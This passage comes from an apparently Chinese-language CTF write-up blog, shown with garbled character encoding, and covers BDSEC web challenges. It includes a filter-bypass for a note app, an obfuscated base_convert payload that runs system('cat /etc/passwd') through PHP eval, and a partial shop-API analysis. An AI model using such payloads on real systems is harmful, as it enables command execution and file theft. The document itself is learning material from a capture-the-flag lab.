src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220720233256890.png" alt="image-20220720233256890"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BDSEC&#123;Y3Y_7H1515_7H3_F146&#125;</span><br></pre></td></tr></table></figure><h2 id="Awesome-Note-Keeping"><a href="#Awesome-Note-Keeping" class="headerlink" title="Awesome Note Keeping"></a>Awesome Note Keeping</h2><p>æºç æ³„éœ²index.php.bak</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220720234924808.png" alt="image-20220720234924808"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Awesome Note Keeping&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body style=<span class="string">&quot;padding: 100px; background: #000000; color: #09b576&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;Welcome to Awesome Note Keeping&lt;/h1&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_startup_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;note&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;note_title&quot;</span>])) &#123;<span class="comment">//è¿™é‡Œæ˜¯å†™å…¥çš„æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;note&quot;</span>]) || <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;note_title&quot;</span>])) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;All fields are required.&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&quot;note_title&quot;</span>]) &gt;= <span class="number">13</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Note title is too long.&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&quot;note&quot;</span>]) &gt;= <span class="number">40</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Note is too long.&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$note_title</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&quot;note_title&quot;</span>]);<span class="comment">//æ›¿æ¢flag</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$note_title</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$note_title</span> . <span class="string">&quot;.txt&quot;</span>)) &#123;<span class="comment">//å¦‚æœå­˜åœ¨ï¼Œå°±æŠŠå…¶å±•ç¤ºå‡ºæ¥</span></span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;There is already a note with that title and the note is &lt;br&gt;&quot;</span>;</span><br><span class="line">                    <span class="variable">$note_title</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$note_title</span>);</span><br><span class="line">                    <span class="variable">$myNote</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$note_title</span> . <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">                    <span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$myNote</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$note_title</span> . <span class="string">&quot;.txt&quot;</span>));</span><br><span class="line">                    <span class="title function_ invoke__">fclose</span>(<span class="variable">$myNote</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;<span class="comment">//å¦‚æœä¸å­˜åœ¨ï¼Œå°±å†™å…¥è¿›å»</span></span><br><span class="line">                    <span class="variable">$myNote</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$note_title</span> . <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$myNote</span>, <span class="variable">$_POST</span>[<span class="string">&quot;note&quot;</span>]);</span><br><span class="line">                    <span class="title function_ invoke__">fclose</span>(<span class="variable">$myNote</span>);</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;Your note has been saved.&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Sorry ! You can&#x27;t create flag note.&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;note_title&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&quot;note_title&quot;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&quot;note_title&quot;</span>] != <span class="string">&quot;flag&quot;</span>) &#123;<span class="comment">//è¿™é‡Œæ˜¯è¯»å–ä¿¡æ¯çš„æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$_GET</span>[<span class="string">&quot;note_title&quot;</span>] . <span class="string">&quot;.txt&quot;</span>)) &#123;</span><br><span class="line">            <span class="variable">$myNote</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$_GET</span>[<span class="string">&quot;note_title&quot;</span>] . <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$myNote</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;note_title&quot;</span>] . <span class="string">&quot;.txt&quot;</span>));</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$myNote</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Sorry ! Couldn&#x27;t find any note with that title.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„åœ¨å†™å…¥çš„æ—¶å€™ï¼Œä¼šå¯¹<code>$note_title</code>è¿›è¡Œä¸¤æ¬¡æ›¿æ¢ï¼Œå°†flagæ›¿æ¢ä¸ºç©ºï¼Œæ‰€ä»¥æ•´ä¸¤æ¬¡åµŒå¥—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flaflflagagg</span><br></pre></td></tr></table></figure><p>å¹¶ä¸”ç¬¬ä¸€æ¬¡è¦åˆ›å»ºä¸€ä¸‹<code>$note_title=flaflflagagg</code>ï¼Œç„¶åç¬¬äºŒæ¬¡çš„æ—¶å€™ï¼Œæ»¡è¶³ç¬¬25è¡Œçš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$note_title</span> . <span class="string">&quot;.txt&quot;</span>))</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰ä¼šæ›¿æ¢flagä¸ºç©ºï¼Œè¯»å–flag.txt</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220720234906221.png" alt="image-20220720234906221"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BDSEC&#123;tHe_n0t3_K33p1n6_4W350M3_N5&#125;</span><br></pre></td></tr></table></figure><h2 id="Awesome-Calculator"><a href="#Awesome-Calculator" class="headerlink" title="Awesome Calculator"></a>Awesome Calculator</h2><p>æŸ¥çœ‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filtering</span>(<span class="params"><span class="variable">$query</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$query</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$query</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/([a-z_]+)/&quot;</span>, <span class="variable">$query</span>, <span class="variable">$words</span>);</span><br><span class="line">    <span class="variable">$words</span> = <span class="variable">$words</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$good</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>, <span class="string">&#x27;ncr&#x27;</span>, <span class="string">&#x27;npr&#x27;</span>, <span class="string">&#x27;number_format&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>];</span><br><span class="line">    <span class="variable">$accept_chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789.!^&amp;|+-*/%()[],_&#x27;</span>;</span><br><span class="line">    <span class="variable">$accept_chars</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$accept_chars</span>);</span><br><span class="line">    <span class="variable">$illegal</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$words</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$words</span>[<span class="variable">$i</span>]) &amp;&amp; <span class="title function_ invoke__">array_search</span>(<span class="variable">$words</span>[<span class="variable">$i</span>], <span class="variable">$good</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$illegal</span> .= <span class="variable">$words</span>[<span class="variable">$i</span>] . <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$query</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">array_search</span>(<span class="variable">$query</span>[<span class="variable">$i</span>], <span class="variable">$accept_chars</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$illegal</span> .= <span class="variable">$query</span>[<span class="variable">$i</span>] . <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$illegal</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_calculations</span>(<span class="params"><span class="variable">$argument</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$argument</span>) &gt; <span class="number">1030</span>) <span class="keyword">return</span> <span class="string">&quot;Calculation too long.&quot;</span>;</span><br><span class="line">    <span class="variable">$argument</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$argument</span>);</span><br><span class="line">    <span class="variable">$illegal</span> = <span class="title function_ invoke__">filtering</span>(<span class="variable">$argument</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$illegal</span>)))</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&quot;Oh my god ! What is this: &quot;</span> . <span class="variable">$illegal</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;$result=&#x27;</span> . <span class="variable">$argument</span> . <span class="string">&quot;;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]) &amp;&amp; <span class="keyword">die</span>(<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;My Awesome Calculator&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;body style=<span class="string">&quot;margin: 50px;&quot;</span>&gt;</span><br><span class="line">    &lt;h1&gt;My Awesome Calculator&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form&gt;</span><br><span class="line"></span><br><span class="line">        &lt;input placeholder=<span class="string">&quot;Surprise me with calculations&quot;</span> type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;calculation&quot;</span> value=<span class="string">&quot;&lt;?= <span class="subst">$_GET</span>[&#x27;calculation&#x27;] ?? &#x27;&#x27; ?&gt;&quot;</span> style=<span class="string">&quot;padding: 150px; font-size: 40px;&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;calculation&#x27;</span>])) : <span class="meta">?&gt;</span></span><br><span class="line">        &lt;div&gt;</span><br><span class="line">            &lt;div style=<span class="string">&quot;font-size: 40px;&quot;</span>&gt;</span><br><span class="line">                Result : <span class="meta">&lt;?=</span> @<span class="title function_ invoke__">do_calculations</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;calculation&#x27;</span>]) <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">endif</span> <span class="meta">?&gt;</span></span><br><span class="line">    &lt;a href=<span class="string">&quot;?source&quot;</span>&gt;Source&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><p>åŸé¢˜</p><p><a href="https://ctftime.org/writeup/25765">CTFtime.org &#x2F; BambooFox CTF 2021 &#x2F; Calc.exe Online &#x2F; Writeup</a></p><p>cat &#x2F;etc&#x2F;passwd</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">1751504350</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">base_convert</span>(<span class="number">477080140104</span>,<span class="number">10</span>,<span class="number">36</span>).<span class="title function_ invoke__">base_convert</span>(<span class="number">189751590363</span>,<span class="number">10</span>,<span class="number">36</span>).<span class="title function_ invoke__">base_convert</span>(<span class="number">189803607951</span>,<span class="number">10</span>,<span class="number">36</span>).<span class="title function_ invoke__">base_convert</span>(<span class="number">428637964</span>,<span class="number">10</span>,<span class="number">36</span>)))</span><br></pre></td></tr></table></figure><p>å…¶ä¸­å¯¹åº”å…³ç³»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">1751504350</span>,<span class="number">10</span>,<span class="number">36</span>) system</span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>) hex2bin</span><br></pre></td></tr></table></figure><p>åœ¨åŸæœ‰çš„wpä¸Šè¿›è¡Œä¿®æ”¹ï¼Œå°†&#x2F;ect&#x2F;passwdæ›¿æ¢ä¸º<code>*</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base_convert</span>(<span class="number">82</span>,<span class="number">10</span>,<span class="number">36</span>)));   <span class="comment">//*</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">base_convert</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;*&quot;</span>),<span class="number">36</span>,<span class="number">10</span>));</span><br></pre></td></tr></table></figure><p>æœ€åçš„payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">1751504350</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">base_convert</span>(<span class="number">477080140104</span>,<span class="number">10</span>,<span class="number">36</span>).<span class="title function_ invoke__">base_convert</span>(<span class="number">82</span>,<span class="number">10</span>,<span class="number">36</span>)))</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220721002946630.png" alt="image-20220721002946630"></p><h2 id="Knight-Squad-Shop"><a href="#Knight-Squad-Shop" class="headerlink" title="Knight Squad Shop"></a>Knight Squad Shop</h2><p>ç»™äº†é™„ä»¶</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220721110744901.png" alt="image-20220721110744901"></p><p>ä¸»ç•Œé¢</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220721004053128.png" alt="image-20220721004053128"></p><p>æºç ä¸­ä¸»è¦æ˜¯ä¸‰ä¸ªè·¯ç”±</p><ol><li>&#x2F;api&#x2F;v1&#x2F;sell</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/v1/sell&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> [key, value] <span class="keyword">of</span> <span class="title class_">Object</span>.<span class="title function_">entries</span>(req.<span class="property">body</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key === <span class="string">&#x27;flags&#x27;</span> &amp;&amp; !req.<span class="property">session</span>.<span class="property">admin</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!products[key]) &#123;</span><br><span class="line">            products[key] = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(product));        </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> [k, v] <span class="keyword">of</span> <span class="title class_">Object</span>.<span class="title function_">entries</span>(value)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (k === <span class="string">&#x27;quantity&#x27;</span>) &#123;</span><br><span class="line">                products[key][k] += v;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                products[key][k] = v;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Sell successful&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol start="2"><li>&#x2F;api&#x2F;v1&#x2F;buy è´­ä¹°ç›¸å…³äº§å“</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/v1/buy&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; product, quantity &#125; = req.<span class="property">body</span>;     </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> product === <span class="string">&#x27;undefined&#x27;</span> || <span class="keyword">typeof</span> quantity !== <span class="string">&#x27;number&#x27;</span> || quantity &lt;= <span class="number">0</span> || !products[product]) &#123;    <span class="comment">//products[product]è¦å­˜åœ¨</span></span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid request&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (products[product].<span class="property">quantity</span> &gt;= quantity) &#123;</span><br><span class="line">        <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">money</span> &gt;= products[product].<span class="property">price</span> * quantity) &#123;</span><br><span class="line">            products[product].<span class="property">quantity</span> -= quantity;</span><br><span class="line">            req.<span class="property">session</span>.<span class="property">money</span> -= products[product].<span class="property">price</span> * quantity;</span><br><span class="line">            res.<span class="title function_">json</span>(products[product]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">402</span>).<span class="title function_">send</span>(<span class="string">&#x27;Not enough money&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">451</span>).<span class="title function_">send</span>(<span class="string">&#x27;Not enough product&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol start="3"><li>&#x2F;api&#x2F;v1&#x2F;money å¯ä»¥ä¿®æ”¹é‡‘é¢</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/v1/money&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">admin</span>) &#123;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">money</span> += req.<span class="property">body</span>.<span class="property">money</span>;    </span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;Money added&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Not admin&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span 